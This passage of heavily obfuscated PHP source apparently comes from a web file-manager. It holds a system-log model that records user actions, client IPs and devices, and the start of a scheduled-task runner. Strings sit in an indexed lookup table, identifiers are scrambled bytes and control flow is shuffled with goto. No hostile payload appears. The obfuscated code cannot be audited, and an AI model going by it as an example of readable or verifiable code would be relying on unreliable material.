($this->findByName($D‚ºâ£ÕØ[$_SERVER[ÚŠ•´ÍéÒÑÔ][28]])) { return !1; } return parent::insert($D‚ºâ£ÕØ); } public function update($BÒ§Îì“¿¨, $A…‚–µÊ˜õ) { $e¤ŒæÒ†¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B §¢§Îæì = $this->findByName($BÒ§Îì“¿¨); $BÉ„©©Ì­Ñ = $this->findByName($A…‚–µÊ˜õ[$e¤ŒæÒ†¶[28]]); if (!$B §¢§Îæì || $BÉ„©©Ì­Ñ && $BÉ„©©Ì­Ñ[$e¤ŒæÒ†¶[364]] != $B §¢§Îæì[$e¤ŒæÒ†¶[364]]) { return !1; } return parent::update($B §¢§Îæì[$e¤ŒæÒ†¶[364]], $A…‚–µÊ˜õ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\164", "\146\x75\156\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $CÀ¹ÔÒÕ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($CÀ¹ÔÒÕ[2336] => LNG($CÀ¹ÔÒÕ[2337]), $CÀ¹ÔÒÕ[2338] => LNG($CÀ¹ÔÒÕ[2339]), $CÀ¹ÔÒÕ[2012] => LNG($CÀ¹ÔÒÕ[2340]), $CÀ¹ÔÒÕ[2341] => LNG($CÀ¹ÔÒÕ[2342]), $CÀ¹ÔÒÕ[2343] => LNG($CÀ¹ÔÒÕ[2344]), $CÀ¹ÔÒÕ[2345] => LNG($CÀ¹ÔÒÕ[2346]), $CÀ¹ÔÒÕ[2347] => LNG($CÀ¹ÔÒÕ[2348]), $CÀ¹ÔÒÕ[2349] => LNG($CÀ¹ÔÒÕ[2350]), $CÀ¹ÔÒÕ[2043] => LNG($CÀ¹ÔÒÕ[2351]), $CÀ¹ÔÒÕ[2044] => LNG($CÀ¹ÔÒÕ[2352]), $CÀ¹ÔÒÕ[2353] => LNG($CÀ¹ÔÒÕ[2354]), $CÀ¹ÔÒÕ[2355] => LNG($CÀ¹ÔÒÕ[2356]), $CÀ¹ÔÒÕ[2357] => LNG($CÀ¹ÔÒÕ[2358]), $CÀ¹ÔÒÕ[2359] => LNG($CÀ¹ÔÒÕ[2360]), $CÀ¹ÔÒÕ[2041] => LNG($CÀ¹ÔÒÕ[2361]), $CÀ¹ÔÒÕ[2047] => LNG($CÀ¹ÔÒÕ[2362]), $CÀ¹ÔÒÕ[2363] => LNG($CÀ¹ÔÒÕ[2364]), $CÀ¹ÔÒÕ[2365] => LNG($CÀ¹ÔÒÕ[2366]), $CÀ¹ÔÒÕ[2367] => LNG($CÀ¹ÔÒÕ[2368]), $CÀ¹ÔÒÕ[2369] => LNG($CÀ¹ÔÒÕ[2370]), $CÀ¹ÔÒÕ[2050] => LNG($CÀ¹ÔÒÕ[2371]), $CÀ¹ÔÒÕ[2051] => LNG($CÀ¹ÔÒÕ[2372]), $CÀ¹ÔÒÕ[2373] => LNG($CÀ¹ÔÒÕ[2374]), $CÀ¹ÔÒÕ[2375] => LNG($CÀ¹ÔÒÕ[2376]), $CÀ¹ÔÒÕ[2377] => LNG($CÀ¹ÔÒÕ[2378]), $CÀ¹ÔÒÕ[2379] => LNG($CÀ¹ÔÒÕ[2380]), $CÀ¹ÔÒÕ[2381] => LNG($CÀ¹ÔÒÕ[2382]), $CÀ¹ÔÒÕ[2045] => LNG($CÀ¹ÔÒÕ[2383]), $CÀ¹ÔÒÕ[2384] => LNG($CÀ¹ÔÒÕ[2385]), $CÀ¹ÔÒÕ[2386] => LNG($CÀ¹ÔÒÕ[2387]), $CÀ¹ÔÒÕ[2388] => LNG($CÀ¹ÔÒÕ[2388]), $CÀ¹ÔÒÕ[2389] => LNG($CÀ¹ÔÒÕ[2016]), $CÀ¹ÔÒÕ[2390] => LNG($CÀ¹ÔÒÕ[2391]), $CÀ¹ÔÒÕ[2392] => LNG($CÀ¹ÔÒÕ[2393]), $CÀ¹ÔÒÕ[2394] => LNG($CÀ¹ÔÒÕ[2395]), $CÀ¹ÔÒÕ[2396] => LNG($CÀ¹ÔÒÕ[2397]), $CÀ¹ÔÒÕ[2398] => LNG($CÀ¹ÔÒÕ[2398]), $CÀ¹ÔÒÕ[2399] => LNG($CÀ¹ÔÒÕ[2400]), $CÀ¹ÔÒÕ[2401] => LNG($CÀ¹ÔÒÕ[2402]), $CÀ¹ÔÒÕ[2403] => LNG($CÀ¹ÔÒÕ[2404]), $CÀ¹ÔÒÕ[2405] => LNG($CÀ¹ÔÒÕ[2406]), $CÀ¹ÔÒÕ[2407] => LNG($CÀ¹ÔÒÕ[2408]), $CÀ¹ÔÒÕ[2409] => LNG($CÀ¹ÔÒÕ[2410])); } private function typeFile() { $D‚‰ï“¹ÙÉ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÇÀ¢® = array($D‚‰ï“¹ÙÉ[2047] => array($D‚‰ï“¹ÙÉ[2048]), $D‚‰ï“¹ÙÉ[2357] => array($D‚‰ï“¹ÙÉ[2411]), $D‚‰ï“¹ÙÉ[2359] => array($D‚‰ï“¹ÙÉ[2412]), $D‚‰ï“¹ÙÉ[2041] => array($D‚‰ï“¹ÙÉ[2042]), $D‚‰ï“¹ÙÉ[2365] => array(), $D‚‰ï“¹ÙÉ[2367] => array(), $D‚‰ï“¹ÙÉ[2369] => array(), $D‚‰ï“¹ÙÉ[2050] => array($D‚‰ï“¹ÙÉ[2052]), $D‚‰ï“¹ÙÉ[2051] => array($D‚‰ï“¹ÙÉ[2052]), $D‚‰ï“¹ÙÉ[2373] => array($D‚‰ï“¹ÙÉ[2413]), $D‚‰ï“¹ÙÉ[2375] => array($D‚‰ï“¹ÙÉ[2413]), $D‚‰ï“¹ÙÉ[2377] => array($D‚‰ï“¹ÙÉ[2414]), $D‚‰ï“¹ÙÉ[2363] => array($D‚‰ï“¹ÙÉ[2415]), $D‚‰ï“¹ÙÉ[2379] => array($D‚‰ï“¹ÙÉ[2416]), $D‚‰ï“¹ÙÉ[2381] => array($D‚‰ï“¹ÙÉ[2417]), $D‚‰ï“¹ÙÉ[2045] => array($D‚‰ï“¹ÙÉ[2046])); return $FÇÀ¢®; } private function typeAll() { goto AÁóæŒĞÉ±; B‹åÄùÕìÌ: return $dÍÖË“’éš; goto eä—äô’™; A÷‹ôŸ‹…: foreach ($a¾‚ã¾¢­ as $Aº¤ïŠÃÌ => $fÅ½Í±öëÔ) { $dÍÖË“’éš[$fÅ½Í±öëÔ[0]] = $dÍÖË“’éš[$Aº¤ïŠÃÌ]; } $dÍÖË“’éš[$dÄœ³×ƒˆ[2052]] = LNG($dÄœ³×ƒˆ[2418]); $dÍÖË“’éš[$dÄœ³×ƒˆ[2413]] = LNG($dÄœ³×ƒˆ[2419]); goto B‹åÄùÕìÌ; AÁóæŒĞÉ±: $dÄœ³×ƒˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÍÖË“’éš = $this->typeList; $a¾‚ã¾¢­ = array_filter($this->typeFile()); goto A÷‹ôŸ‹…; eä—äô’™: } public function addLog($AŞïô´ÛÃö, $d£‹ôí…®š = array()) { goto AÕøå é»ø; C’¯¥È½‰: $fÀÕ´ƒ«Á = get_client_ip(); if (!$d£‹ôí…®š || strlen(json_encode($d£‹ôí…®š)) >= 1024) { $d£‹ôí…®š = array($f¾œá‚ùõ [2420] => $fÀÕ´ƒ«Á); } else { if (is_array($d£‹ôí…®š)) { $d£‹ôí…®š[$f¾œá‚ùõ [2420]] = $fÀÕ´ƒ«Á; } else { $d£‹ôí…®š = array($f¾œá‚ùõ [1026] => $d£‹ôí…®š, $f¾œá‚ùõ [2420] => $fÀÕ´ƒ«Á); } } $d£‹ôí…®š = array($f¾œá‚ùõ [1399] => Session::sign(), $f¾œá‚ùõ [1400] => $FÁŒ›’íÇœ, $f¾œá‚ùõ [29] => $AŞïô´ÛÃö, $f¾œá‚ùõ [1402] => json_encode($d£‹ôí…®š)); goto aÆ¦¾”§ò; aÆ¦¾”§ò: parent::add($d£‹ôí…®š); goto aŞèİÈ“¬È; AÕøå é»ø: $f¾œá‚ùõ  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->typeList[$AŞïô´ÛÃö])) { return; } $FÁŒ›’íÇœ = USER_ID ? USER_ID : (isset($d£‹ôí…®š[$f¾œá‚ùõ [1409]]) ? $d£‹ôí…®š[$f¾œá‚ùõ [1409]] : 0); goto C’¯¥È½‰; aŞèİÈ“¬È: } public function remove($BÜ¹‡“‹¨) { $this->where(array($_SERVER[ÚŠ•´ÍéÒÑÔ][382] => $BÜ¹‡“‹¨))->delete(); } private function _makeOrder($A…ŒšéÇÇ¨ = '') { goto FÛÚˆà“ï; bÒëİˆ…Ó: $e „µàÈ÷ = Input::get($b‚Ú¯´ƒÇç[404], $b‚Ú¯´ƒÇç[7], $b‚Ú¯´ƒÇç[2210], array($b‚Ú¯´ƒÇç[2147], $b‚Ú¯´ƒÇç[400])); $e „µàÈ÷ = $aî–Ó‚ÂŞ[$e „µàÈ÷]; $A…ŒšéÇÇ¨ = $A…ŒšéÇÇ¨ . "{$B¾Œ˜©Š‚É}\40{$e „µàÈ÷}"; goto Eœ”©×–©ù; Eœ”©×–©ù: return $this->order($A…ŒšéÇÇ¨); goto cÒ±„½‰ŒË; FÛÚˆà“ï: $b‚Ú¯´ƒÇç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B¾Œ˜©Š‚É = $b‚Ú¯´ƒÇç[184]; $aî–Ó‚ÂŞ = array($b‚Ú¯´ƒÇç[398] => $b‚Ú¯´ƒÇç[399], $b‚Ú¯´ƒÇç[400] => $b‚Ú¯´ƒÇç[401]); goto bÒëİˆ…Ó; cÒ±„½‰ŒË: } public function get($eÀÁàÅ‘ = '') { goto bçéòÄÅŠ¿; eîŸ¾„¿ª: $FÙÓÀæ˜Ü³[$d×£§‘ÆøË[351]] = $this->logList($FÙÓÀæ˜Ü³[$d×£§‘ÆøË[351]]); return $FÙÓÀæ˜Ü³; goto D£¯Ôçë¡; bçéòÄÅŠ¿: $d×£§‘ÆøË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$eÀÁàÅ‘) { show_json(array()); } $Båç’ëé‘ = array(); goto Cîğõ¹˜«; C’¨Œ¥ŞÑÓ: if (!empty($eÀÁàÅ‘[$d×£§‘ÆøË[2420]])) { $Båç’ëé‘[$d×£§‘ÆøË[401]] = array($d×£§‘ÆøË[746], "\x25{$eÀÁàÅ‘[$d×£§‘ÆøË[2420]]}\x25"); } $FÙÓÀæ˜Ü³ = $this->_makeOrder()->where($Båç’ëé‘)->selectPage(); if (empty($FÙÓÀæ˜Ü³[$d×£§‘ÆøË[351]])) { show_json(array(), !0, $FÙÓÀæ˜Ü³[$d×£§‘ÆøË[348]]); } goto eîŸ¾„¿ª; Cîğõ¹˜«: if ($eÀÁàÅ‘[$d×£§‘ÆøË[1409]]) { $Båç’ëé‘[$d×£§‘ÆøË[1409]] = $eÀÁàÅ‘[$d×£§‘ÆøË[1409]]; } if (isset($eÀÁàÅ‘[$d×£§‘ÆøË[697]])) { $dí½è¼ÍÊ¼ = $eÀÁàÅ‘[$d×£§‘ÆøË[697]]; $e„©„ÓùÙ = isset($eÀÁàÅ‘[$d×£§‘ÆøË[698]]) ? $eÀÁàÅ‘[$d×£§‘ÆøË[698]] : time(); $Båç’ëé‘[$d×£§‘ÆøË[184]] = array($d×£§‘ÆøË[318], array($dí½è¼ÍÊ¼, $e„©„ÓùÙ)); } if ($eÀÁàÅ‘[$d×£§‘ÆøË[29]]) { $E£Ô‡Šõ© = explode($d×£§‘ÆøË[47], $eÀÁàÅ‘[$d×£§‘ÆøË[29]]); $BÅ¾¥§¸…¿ = $this->typeFile(); $a“„ó·Îª = array(); foreach ($E£Ô‡Šõ© as $aŠËº“í¢â) { $a“„ó·Îª[] = $aŠËº“í¢â; if (isset($BÅ¾¥§¸…¿[$aŠËº“í¢â])) { $a“„ó·Îª = array_merge($a“„ó·Îª, $BÅ¾¥§¸…¿[$aŠËº“í¢â]); } } $a“„ó·Îª = array_unique($a“„ó·Îª); if ($a“„ó·Îª) { $Båç’ëé‘[$d×£§‘ÆøË[29]] = array($d×£§‘ÆøË[7], $a“„ó·Îª); } } goto C’¨Œ¥ŞÑÓ; D£¯Ôçë¡: } private function ipAddress(&$cìÄŒÑÂÙ) { $B—«„Ş…ââ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!empty($cìÄŒÑÂÙ[$B—«„Ş…ââ[2420]])) { $d“–’ĞµÛ¯ = IpLocation::get($cìÄŒÑÂÙ[$B—«„Ş…ââ[2420]]); if ($d“–’ĞµÛ¯ == $B—«„Ş…ââ[2421]) { $d“–’ĞµÛ¯ = $B—«„Ş…ââ[2422]; } } else { $d“–’ĞµÛ¯ = LNG($B—«„Ş…ââ[2423]); } $cìÄŒÑÂÙ[$B—«„Ş…ââ[2424]] = $d“–’ĞµÛ¯; } private function descZipDownload($bÉŸÀêÄ‰, &$FèæÜÜŒ„Œ) { $E§Ö¯’çÊ¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($bÉŸÀêÄ‰[$E§Ö¯’çÊ¶[2425]])) { return; } $fàÎ†ÂÒª = json_decode($bÉŸÀêÄ‰[$E§Ö¯’çÊ¶[2425]], !0); foreach ($fàÎ†ÂÒª as $bŠğ‘‡“Š’) { if (!IO::init($bŠğ‘‡“Š’[$E§Ö¯’çÊ¶[75]])) { continue; } if (!($d‹–¢ƒÊİº = IO::infoFull($bŠğ‘‡“Š’[$E§Ö¯’çÊ¶[75]]))) { continue; } $bÉŸÀêÄ‰[$E§Ö¯’çÊ¶[75]] = $bŠğ‘‡“Š’[$E§Ö¯’çÊ¶[75]]; $FèæÜÜŒ„Œ[] = $bÉŸÀêÄ‰[$E§Ö¯’çÊ¶[2243]] = $d‹–¢ƒÊİº[$E§Ö¯’çÊ¶[457]]; break; } return $bÉŸÀêÄ‰; } private function getSourceList(&$dÉÌí¶•Å) { $dùŠê‰ÃËÈ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D¿Ìë£™¥ = array(); foreach ($dÉÌí¶•Å as $Eà—Ê¯ó¸ñ => $f¾êàØÜ°) { goto aœ˜¨öà¥; dØš¢Úöªä: $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[366]]; $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[2243]]; if ($Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[29]] == $dùŠê‰ÃËÈ[488]) { $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[401]][$dùŠê‰ÃËÈ[998]]; $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[401]][$dùŠê‰ÃËÈ[999]]; } goto cœ”®ÛÇ‡·; aœ˜¨öà¥: $Eì™õ¶óÑŠ = json_decode($f¾êàØÜ°[$dùŠê‰ÃËÈ[401]], !0); if ($f¾êàØÜ°[$dùŠê‰ÃËÈ[29]] == $dùŠê‰ÃËÈ[2044]) { $Eì™õ¶óÑŠ = $this->descZipDownload($Eì™õ¶óÑŠ, $D¿Ìë£™¥); $dÉÌí¶•Å[$Eà—Ê¯ó¸ñ][$dùŠê‰ÃËÈ[401]] = json_encode($Eì™õ¶óÑŠ); continue; } if (strpos($f¾êàØÜ°[$dùŠê‰ÃËÈ[29]], $dùŠê‰ÃËÈ[2244]) !== 0) { goto eƒŸ‚êÃ»É; eƒŸ‚êÃ»É: if (!isset($Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[75]]) || strpos($f¾êàØÜ°[$dùŠê‰ÃËÈ[29]], $dùŠê‰ÃËÈ[2426]) !== 0) { continue; } if (!IO::init($Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[75]])) { continue; } if (!($bµ÷ŞõÍø© = IO::infoFull($Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[75]]))) { continue; } goto AØÁµœ…ä; AØÁµœ…ä: $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[366]] = $bµ÷ŞõÍø©[$dùŠê‰ÃËÈ[366]]; $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[2243]] = $bµ÷ŞõÍø©[$dùŠê‰ÃËÈ[457]]; $dÉÌí¶•Å[$Eà—Ê¯ó¸ñ][$dùŠê‰ÃËÈ[401]] = json_encode($Eì™õ¶óÑŠ); goto d¿À‡İô“; d¿À‡İô“: continue; goto A°ëëŒ®ÑÁ; A°ëëŒ®ÑÁ: } goto dØš¢Úöªä; cœ”®ÛÇ‡·: if ($Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[29]] == $dùŠê‰ÃËÈ[2251]) { $D¿Ìë£™¥[] = $Eì™õ¶óÑŠ[$dùŠê‰ÃËÈ[401]][$dùŠê‰ÃËÈ[366]]; } goto eáÑó£¼ì–; eáÑó£¼ì–: } if (!$D¿Ìë£™¥) { return array(); } return Model($dùŠê‰ÃËÈ[747])->sourceListInfo($D¿Ìë£™¥, !0); } private function logList($Fë’¾£Èßñ) { goto C‘Û ¹·Æ•; d÷†òÏÕŠ‚: $CÊòíËØªà = array(); foreach ($Fë’¾£Èßñ as $dÓòÈ§Â¹Ó => $Eßï•ó”ø) { goto FË¥‡•Ë¡; FË¥‡•Ë¡: $d•µ§¼ŒÔ” = $Eßï•ó”ø[$e‡ÂËª‘ùÆ[29]]; $CÂÊ‘‚›¡œ = isset($aÕ¦Ûƒğ²À[$Eßï•ó”ø[$e‡ÂËª‘ùÆ[1409]]]) ? $aÕ¦Ûƒğ²À[$Eßï•ó”ø[$e‡ÂËª‘ùÆ[1409]]] : !1; $D¶ÚÒ¤á‘ç = strpos($d•µ§¼ŒÔ”, $e‡ÂËª‘ùÆ[2427]) === 0 ? LNG($e‡ÂËª‘ùÆ[2428]) : LNG($e‡ÂËª‘ùÆ[2423]); goto AŞè¦¨í«; FŒè¥ÜÈ­Ş: unset($Eßï•ó”ø[$e‡ÂËª‘ùÆ[2429]]); $cã©ãÃŠ¸[] = $Eßï•ó”ø; goto E¼„¿¥¾ï’; E¡çø’¶‚„: $this->ipAddress($Eßï•ó”ø); if (strpos($d•µ§¼ŒÔ”, $e‡ÂËª‘ùÆ[2244]) === 0 || isset($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2243]])) { goto a³‹â§âÄˆ; F®Ï˜ò×ã¡: if ($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[29]] == $e‡ÂËª‘ùÆ[2251]) { $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[366]] = $b™Ï¿ôñ[$aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[366]]]; } if ($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[29]] == $e‡ÂËª‘ùÆ[2039]) { $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2256]] = $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[388]]; $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2243]] = $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2256]][$e‡ÂËª‘ùÆ[366]]; $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[388]] = !1; $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[366]] = $e‡ÂËª‘ùÆ[33]; } if ($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[388]] && $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[388]][$e‡ÂËª‘ùÆ[368]] == $e‡ÂËª‘ùÆ[1072]) { $CÊòíËØªà[] = $Eßï•ó”ø[$e‡ÂËª‘ùÆ[364]]; unset($Fë’¾£Èßñ[$dÓòÈ§Â¹Ó]); continue; } goto b©®ëŒ„Ü; b©®ëŒ„Ü: if ($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2256]] && $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2256]][$e‡ÂËª‘ùÆ[368]] == $e‡ÂËª‘ùÆ[1072]) { $CÊòíËØªà[] = $Eßï•ó”ø[$e‡ÂËª‘ùÆ[364]]; unset($Fë’¾£Èßñ[$dÓòÈ§Â¹Ó]); continue; } goto cï«À†ä²›; a³‹â§âÄˆ: $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[388]] = $b™Ï¿ôñ[$aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[366]]]; $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2256]] = $b™Ï¿ôñ[$aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2243]]]; if ($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[29]] == $e‡ÂËª‘ùÆ[488]) { $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[998]] = $b™Ï¿ôñ[$aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[998]]]; $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[999]] = $b™Ï¿ôñ[$aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[401]][$e‡ÂËª‘ùÆ[999]]]; } goto F®Ï˜ò×ã¡; cï«À†ä²›: } $Eßï•ó”ø[$e‡ÂËª‘ùÆ[401]] = $aÈÍÁ©Á­Ÿ; goto FŒè¥ÜÈ­Ş; AŞè¦¨í«: $Eßï•ó”ø[$e‡ÂËª‘ùÆ[28]] = isset($CÂÊ‘‚›¡œ[$e‡ÂËª‘ùÆ[28]]) ? $CÂÊ‘‚›¡œ[$e‡ÂËª‘ùÆ[28]] : LNG($e‡ÂËª‘ùÆ[2423]); $Eßï•ó”ø[$e‡ÂËª‘ùÆ[2292]] = isset($CÂÊ‘‚›¡œ[$e‡ÂËª‘ùÆ[2292]]) ? $CÂÊ‘‚›¡œ[$e‡ÂËª‘ùÆ[2292]] : $e‡ÂËª‘ùÆ[33]; $Eßï•ó”ø[$e‡ÂËª‘ùÆ[1316]] = isset($bòôå×Şˆ [$d•µ§¼ŒÔ”]) ? $bòôå×Şˆ [$d•µ§¼ŒÔ”] : $D¶ÚÒ¤á‘ç; goto EçÂÏŸ¿Œ”; EçÂÏŸ¿Œ”: $Eßï•ó”ø[$e‡ÂËª‘ùÆ[2209]] = $CÂÊ‘‚›¡œ; $aÈÍÁ©Á­Ÿ = json_decode($Eßï•ó”ø[$e‡ÂËª‘ùÆ[401]], !0); $Eßï•ó”ø[$e‡ÂËª‘ùÆ[2420]] = isset($aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2420]]) ? $aÈÍÁ©Á­Ÿ[$e‡ÂËª‘ùÆ[2420]] : $e‡ÂËª‘ùÆ[33]; goto E¡çø’¶‚„; E¼„¿¥¾ï’: } $this->clearSystemPathLog($CÊòíËØªà); goto Aî¢¸ê¢Ø; e¤ËööëÅÍ: $b™Ï¿ôñ = $this->getSourceList($Fë’¾£Èßñ); $bòôå×Şˆ  = $this->typeAll(); $cã©ãÃŠ¸ = array(); goto d÷†òÏÕŠ‚; Aî¢¸ê¢Ø: return $cã©ãÃŠ¸; goto B­Şï®§¯; C‘Û ¹·Æ•: $e‡ÂËª‘ùÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bÁ±ËÈôÆ = array_to_keyvalue($Fë’¾£Èßñ, $e‡ÂËª‘ùÆ[33], $e‡ÂËª‘ùÆ[1409]); $aÕ¦Ûƒğ²À = Model($e‡ÂËª‘ùÆ[473])->userListInfo(array_unique($bÁ±ËÈôÆ)); goto e¤ËööëÅÍ; B­Şï®§¯: } private function clearSystemPathLog($B‹¬¹µØù¶) { $fùÊ×—ŒÕã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (count($B‹¬¹µØù¶) == 0) { return; } $C–å¬Ù×½í = array($fùÊ×—ŒÕã[364] => array($fùÊ×—ŒÕã[7], array_unique($B‹¬¹µØù¶))); $this->where($C–å¬Ù×½í)->delete(); } public function deviceList($CÕ¿èÉ»…‹, $C­÷¨ÑŒœ† = 0) { $a×âÍÙ«· =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B³´«Æì’ = array($a×âÍÙ«·[1409] => $CÕ¿èÉ»…‹, $a×âÍÙ«·[184] => array($a×âÍÙ«·[922], $C­÷¨ÑŒœ†), $a×âÍÙ«·[29] => $a×âÍÙ«·[2012]); $A¯÷öİåÍ = array(); $f±ƒ£¦ Ü± = $this->field($a×âÍÙ«·[2430])->where($B³´«Æì’)->order($a×âÍÙ«·[2254])->limit(50)->select(); foreach ($f±ƒ£¦ Ü± as $fç˜ÚÒ™ØÓ => $c«‡£ÁºóÀ) { goto Añ¢ùÈšˆ˜; Añ¢ùÈšˆ˜: if ($fç˜ÚÒ™ØÓ > 0 && abs($c«‡£ÁºóÀ[$a×âÍÙ«·[184]] - $f±ƒ£¦ Ü±[$fç˜ÚÒ™ØÓ - 1][$a×âÍÙ«·[184]]) < 5) { continue; } $d²èó¦ŸšÆ = json_decode($c«‡£ÁºóÀ[$a×âÍÙ«·[401]], !0); $c«‡£ÁºóÀ[$a×âÍÙ«·[2420]] = isset($d²èó¦ŸšÆ[$a×âÍÙ«·[2420]]) ? $d²èó¦ŸšÆ[$a×âÍÙ«·[2420]] : $a×âÍÙ«·[33]; goto C öãæïíŞ; C öãæïíŞ: unset($d²èó¦ŸšÆ[$a×âÍÙ«·[2420]]); $cƒöµŞ‚š = $this->deviceType($d²èó¦ŸšÆ[$a×âÍÙ«·[2245]]); if (isset($A¯÷öİåÍ[$cƒöµŞ‚š])) { continue; } goto C‘Õï‘ÓŞ›; C‘Õï‘ÓŞ›: $this->ipAddress($c«‡£ÁºóÀ); $c«‡£ÁºóÀ[$a×âÍÙ«·[401]] = $d²èó¦ŸšÆ; $A¯÷öİåÍ[$cƒöµŞ‚š] = $c«‡£ÁºóÀ; goto fÓÛñ¶¤; fÓÛñ¶¤: } return array_values($A¯÷öİåÍ); } public function deviceType($fÅœù”˜ñô) { return $fÅœù”˜ñô; } } goto d„¢‰™Å; C ¼ÒÊâ·: class AutoTask { public static function start() { goto A×¼¡Ğïï¢; bí«»Õò°Æ: http_close(); self::valueSet($DÓ¶…Ê•™ì[1373], $DÓ¶…Ê•™ì[83]); Hook::bind($DÓ¶…Ê•™ì[1375], $DÓ¶…Ê•™ì[1376]); goto b’–çÌÓÅ°; b’–çÌÓÅ°: while (!0) { self::cacheClear(); if (self::valueGet($DÓ¶…Ê•™ì[684]) != $DÓ¶…Ê•™ì[83]) { self::valueSet($DÓ¶…Ê•™ì[1373], $DÓ¶…Ê•™ì[464]); self::log($DÓ¶…Ê•™ì[1377]); die; } self::valueSet($DÓ¶…Ê•™ì[1373], $DÓ¶…Ê•™ì[83]); self::valueSet($DÓ¶…Ê•™ì[1374], time()); self::taskRunAll(); sleep(self::valueGet($DÓ¶…Ê•™ì[1378])); } goto eÏœ‰áìâš; A×¼¡Ğïï¢: $DÓ¶…Ê•™ì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (self::valueGet($DÓ¶…Ê•™ì[684]) != $DÓ¶…Ê•™ì[83]) { return; } if (self::valueGet($DÓ¶…Ê•™ì[1373]) == $DÓ¶…Ê•™ì[83]) { $c¿–ù¨ò× = self::valueGet($DÓ¶…Ê•™ì[1374]); if (time() - $c¿–ù¨ò× > 3600 * 2) { self::restart(); } return; } goto bí«»Õò°Æ; eÏœ‰áìâš: } public static function restart() { $dÄˆÚÃ­Ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; http_close(); self::valueSet($dÄˆÚÃ­Ö[684], $dÄˆÚÃ­Ö[464]); sleep(self::valueGet($dÄˆÚÃ­Ö[1378]) + 5); self::valueSet($dÄˆÚÃ­Ö[1373], $dÄˆÚÃ­Ö[464]); self::valueSet($dÄˆÚÃ­Ö[684], $dÄˆÚÃ­Ö[83]); } public static function shutdownEvent() { $b†ÔÜø‡•Á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::valueSet($b†ÔÜø‡•Á[1373], $b†ÔÜø‡•Á[464]); self::log($b†ÔÜø‡•Á[1379]); } public static function config($EÍ¨ÀÄ™§å, $cè­ò¾ÎŒ¬) { $CºÂõÕˆ§‚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $déÃ‚…ª‹† = 20; $cè­ò¾ÎŒ¬ = intval($cè­ò¾ÎŒ¬) <= $déÃ‚…ª‹† ? $déÃ‚…ª‹† : intval($cè­ò¾ÎŒ¬); self::valueSet($CºÂõÕˆ§‚[684], $EÍ¨ÀÄ™§å); self::valueSet($CºÂõÕˆ§‚[1378], $cè­ò¾ÎŒ¬); } private static function taskRunAll() { $a«áŠÊ·šÅ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C²×Æìˆø• = Model($a«áŠÊ·šÅ[1380])->listData(); $BµèÕÓ— = count($C²×Æìˆø•); for ($Aº®²Ë²®¬ = 0; $Aº®²Ë²®¬ < $BµèÕÓ—; $Aº®²Ë²®¬++) { $C·†•—ø‹ = 